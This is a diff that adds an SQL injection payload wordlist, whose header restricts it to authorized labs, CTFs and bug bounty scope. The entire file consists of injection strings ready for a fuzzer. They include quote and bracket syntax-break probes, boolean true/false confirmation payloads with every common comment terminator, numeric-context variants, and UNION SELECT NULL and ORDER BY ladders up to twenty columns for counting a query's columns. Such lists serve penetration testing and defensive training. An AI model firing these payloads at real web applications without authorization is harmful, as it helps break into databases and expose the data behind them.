@@ -1,0 +1,228 @@
+# =====================================================
+# SQLi DETECTION + CONFIRMATION WORDLIST
+# Authorized testing only: own labs, CTFs, in-scope bug bounty assets.
+# Order: bare probes -> boolean confirm (all comment variants) -> numeric -> column count
+# =====================================================
+
+## 1. BARE SYNTAX-BREAK PROBES
+'
+"
+`
+')
+")
+`)
+'))
+"))
+\
+%27
+%22
+
+## 2. BOOLEAN CONFIRM — single quote, all comment variants
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1
+' AND 1=2
+' OR 1=1
+' OR 1=2
+' AND 1=1--
+' AND 1=1-- -
+' AND 1=1#
+' AND 1=1/**/
+' AND 1=1-- 
+' AND 1=1;--
+' AND 1=1`
+' AND 1=2--
+' AND 1=2-- -
+' AND 1=2#
+' AND 1=2/**/
+' AND 1=2-- 
+' AND 1=2;--
+' AND 1=2`
+' OR 1=1--
+' OR 1=1-- -
+' OR 1=1#
+' OR 1=1/**/
+' OR 1=1-- 
+' OR 1=1;--
+' OR 1=1`
+' OR 1=2--
+' OR 1=2-- -
+' OR 1=2#
+' OR 1=2/**/
+' OR 1=2-- 
+' OR 1=2;--
+' OR 1=2`
+
+## 3. BOOLEAN CONFIRM — double quote, all comment variants
+" AND "1"="1
+" AND "1"="2
+" OR "1"="1
+" OR "1"="2
+" AND 1=1--
+" AND 1=1-- -
+" AND 1=1#
+" AND 1=1/**/
+" AND 1=1-- 
+" AND 1=1;--
+" AND 1=1`
+" AND 1=2--
+" AND 1=2-- -
+" AND 1=2#
+" AND 1=2/**/
+" AND 1=2-- 
+" AND 1=2;--
+" AND 1=2`
+" OR 1=1--
+" OR 1=1-- -
+" OR 1=1#
+" OR 1=1/**/
+" OR 1=1-- 
+" OR 1=1;--
+" OR 1=1`
+" OR 1=2--
+" OR 1=2-- -
+" OR 1=2#
+" OR 1=2/**/
+" OR 1=2-- 
+" OR 1=2;--
+" OR 1=2`
+
+## 4. BOOLEAN CONFIRM — bracket-close contexts, all comment variants
+') AND 1=1--
+') AND 1=1-- -
+') AND 1=1#
+') AND 1=1/**/
+') AND 1=1-- 
+') AND 1=1;--
+') AND 1=1`
+') AND 1=2--
+') AND 1=2-- -
+') AND 1=2#
+') AND 1=2/**/
+') AND 1=2-- 
+') AND 1=2;--
+') AND 1=2`
+') OR 1=1--
+') OR 1=1-- -
+') OR 1=1#
+') OR 1=1/**/
+') OR 1=1-- 
+') OR 1=1;--
+') OR 1=1`
+') OR 1=2--
+') OR 1=2-- -
+') OR 1=2#
+') OR 1=2/**/
+') OR 1=2-- 
+') OR 1=2;--
+') OR 1=2`
+") AND 1=1--
+") AND 1=1-- -
+") AND 1=1#
+") AND 1=1/**/
+") AND 1=1-- 
+") AND 1=1;--
+") AND 1=1`
+") AND 1=2--
+") AND 1=2-- -
+") AND 1=2#
+") AND 1=2/**/
+") AND 1=2-- 
+") AND 1=2;--
+") AND 1=2`
+") OR 1=1--
+") OR 1=1-- -
+") OR 1=1#
+") OR 1=1/**/
+") OR 1=1-- 
+") OR 1=1;--
+") OR 1=1`
+") OR 1=2--
+") OR 1=2-- -
+") OR 1=2#
+") OR 1=2/**/
+") OR 1=2-- 
+") OR 1=2;--
+") OR 1=2`
+
+## 5. NUMERIC CONTEXT (no quotes)
+1
+2-1
+1 AND 1=1
+1 AND 1=2
+1 OR 1=1
+1 OR 1=2
+1 AND 1=1--
+1 AND 1=1-- -
+1 AND 1=1#
+1 AND 1=1/**/
+1 AND 1=1-- 
+1 AND 1=1;--
+1 AND 1=1`
+1 AND 1=2--
+1 AND 1=2-- -
+1 AND 1=2#
+1 AND 1=2/**/
+1 AND 1=2-- 
+1 AND 1=2;--
+1 AND 1=2`
+1 OR 1=1--
+1 OR 1=1-- -
+1 OR 1=1#
+1 OR 1=1/**/
+1 OR 1=1-- 
+1 OR 1=1;--
+1 OR 1=1`
+1 OR 1=2--
+1 OR 1=2-- -
+1 OR 1=2#
+1 OR 1=2/**/
+1 OR 1=2-- 
+1 OR 1=2;--
+1 OR 1=2`
+
+## 6. COLUMN COUNT — UNION NULL ladder 1..20 (generic --)
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+
+## 7. COLUMN COUNT — ORDER BY 1..20
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 6--
+' ORDER BY 7--
+' ORDER BY 8--
+' ORDER BY 9--
+' ORDER BY 10--
+' ORDER BY 11--
+' ORDER BY 12--
+' ORDER BY 13--
+' ORDER BY 14--
+' ORDER BY 15--
+' ORDER BY 16--
+' ORDER BY 17--
+' ORDER BY 18--
+' ORDER BY 19--
+' ORDER BY 20--
